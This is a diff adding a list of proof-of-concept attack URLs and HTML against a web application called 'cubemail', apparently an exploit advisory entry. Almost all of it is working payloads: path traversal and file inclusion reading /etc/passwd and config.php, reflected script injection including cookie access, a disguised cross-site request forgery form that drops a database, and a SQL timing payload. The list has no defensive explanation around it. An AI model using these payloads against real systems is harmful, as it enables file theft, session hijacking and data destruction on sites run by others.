@@ -1,0 +1,38 @@
+Local File-inclusion:
+
+http://www.example.com/learn/cubemail/install.php?language=../../../../../../../../../../../../../../../../../etc/passwd%00
+
+
+Cross-site scripting:
+
+http://www.example.com/learn/cubemail/install.php?phase=8%3Cscript%3Ealert%281%29;%3C/script%3E&language=en&submit=Installation
+http://www.example.com/learn/cubemail/sql.php?db=0&dbid=1&tablename=%3Cscript%3Ealert%281%29;%3C/script%3E
+http://www.example.com/learn/cubemail/sql.php?db=0&dbid=%3Cscript%3Ealert%281%29;%3C/script%3E&tablename=1
+http://www.example.com/learn/cubemail/restore.php?filename=%3Cscript%3Ealert%281%29;%3C/script%3E
+http://www.example.com/learn/cubemail/index.php?page=javascript:alert%28document.cookie%29;
+
+Cross-site request-forgery:
+
+<img src="http://www.example.com/tld/meonyourpc.PNG" heigth="250" width="300" />
+<form name="hackit" id="hackit" action="http://www.example.com/learn/cubemail/main.php?action=db&dbid=1" method="post">
+<p><blink>Hotlink Protection is Active! Please click refresh button.</blink></p>
+<input name="kill1" value="Refresh" onclick="alert('Congrats!) Your Database Dropped!')" type="submit">
+</form>
+
+
+http://www.example.com/learn/cubemail/install.php?language=en&phase=101
+http://www.example.com/learn/cubemail/install.php?language=en&phase=2
+
+<img src="http://www.example.com/learn/cubemail/sql.php?sql_statement=select+benchmark%28100000000,md5%28now%28%29%29%29--" heigth="0" width="0" />
+
+
+Directory-traversal:
+
+http://www.example.com/learn/cubemail/filemanagement.php?action=dl&f=../../config.php
+http://www.example.com/learn/cubemail/filemanagement.php?action=dl&f=../../../../../../../../../../../etc/passwd%00
+
+Information disclosure
+
+http://www.example.com/learn/cubemail/restore.php
+http://www.example.com/learn/cubemail/dump.php
+http://www.example.com/learn/cubemail/refresh_dblist.php
